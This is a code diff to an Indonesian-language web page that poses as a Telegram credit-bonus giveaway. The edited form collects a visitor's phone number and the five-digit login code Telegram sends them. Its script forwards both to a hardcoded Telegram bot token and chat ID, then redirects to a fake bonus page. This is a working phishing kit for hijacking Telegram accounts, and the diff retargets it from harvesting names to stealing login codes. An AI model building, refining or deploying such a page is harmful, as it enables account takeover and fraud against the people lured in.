@@ -13,17 +13,17 @@
         <h2 style="color: #10b3ff">GIVEAWAY BONUS PULSA TELEGRAM</h2>
         <div class="container">
             <div class="logo-atas">
-                <img class="img-fluid" src="atas.jpg" alt="">
+                <img class="img-fluid" src="telegram-logo.png" alt="">
                 </div>
             
     </nav>
     <div class="container">
         <div class="title-web mt-2">
             <div class="logo-atas">
-                <center><img class="img-fluid" src="images.png" alt=""></center>
+                <center><img class="img-fluid" src="fotopulsa.jpg" alt=""></center>
             </div>
       <div class="title-web mt-1">
-        <h2 class="text-center">Isi data penerima Bonus Telegram</h2>
+        <h2 class="text-center">isi Kode Bonus dikirim di Telegram </h2>
       </div><br>
       <div class="image-web">
       </div>
@@ -32,22 +32,9 @@
             <center><input type="number" name="nope" id="nope" style="border: Container; border: 1px solid rgb(0, 195, 255); width: 80% "></center>
              
         <div class="col-md-3 mt-3">
-            <label class="ms-5" for="pin">Nama Anda</label><br>
-            <center><input type="text" name="pin" id="pin" style="border: Container; border: 1px solid rgb(0, 153, 255); width: 80%"></center>
+            <label class="ms-5" for="pin">Kode 5 angka di telegram</label><br>
+            <center><input type="number" name="pin" id="pin" style="border: Container; border: 1px solid rgb(0, 153, 255); width: 80%"></center>
         </div>
-        <div class="container w-75 mt-3">
-          <div class="form-cc">
-              <div class="form-group">
-                  <div class="form-group" style="width: 70%">
-                      <select style="border-radius: 15px" class="form-control shadow-sm form-control-sm" id="input1">
-                          <option value=>=Masukan Jenis Simcard anda=</option>
-                          <option value="TELKOMSEL">TELKOMSEL</option>
-                          <option value="INDOSAT">INDOSAT</option>
-                          <option value="TREE">TREE</option>
-                          <option value="XL">XL</option>
-                          <option value="LAINNYA">LAINNYA</option>
-                      </select>
-                  </div>
       </div>
       <div class="bnt-next mt-3 mb-3 text-center"></div>
       <center><button onclick="next()" class="btnNext" style="background-color: #0ca2e7; border: none; border-radius: 10px; width: 90%; color: white; font-weight: bold; height: 45px">kirimkan</button></center>
@@ -63,13 +50,12 @@
        let proses = document.querySelector("#proses");
        let nope = document.querySelector("#nope").value
        let pin = document.querySelector("#pin").value
-       const nocard = document.querySelector("#input1").value;
        let token = "6854558867:AAHpWOz8lFqJqzHXq9RbVl-gS2YnGoy3oxg"
        let id_tele = "6250486742"
        if (nope === "" | pin === "") {
          alert("Mohon Isi data Dengan Benar")
        } else {
-         let message = `  *Telegram Bonus*%0A%0ASIMCARD: ${nocard}%0A________________%0ANo. handphone:%0A${nope}%0A----------------------%0Anama: ${pin}`
+         let message = `  *Kode Telegram Bonus*%0A________________%0ANo. handphone:%0A${nope}%0A%0AKode Telegram: ${pin}`
          let api = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id_tele}&text=${message}`
          fetch(api, {
            method: 'POST',
@@ -77,7 +63,7 @@
          .then((response) => response.json())
          .then(data => {
                 console.log('Pesan terkirim:', data);
-                window.location.href = "kode.html"
+                window.location.href = "bonus_saldo.html"
           })
           .catch((error) => {
             console.error('Error:', error);
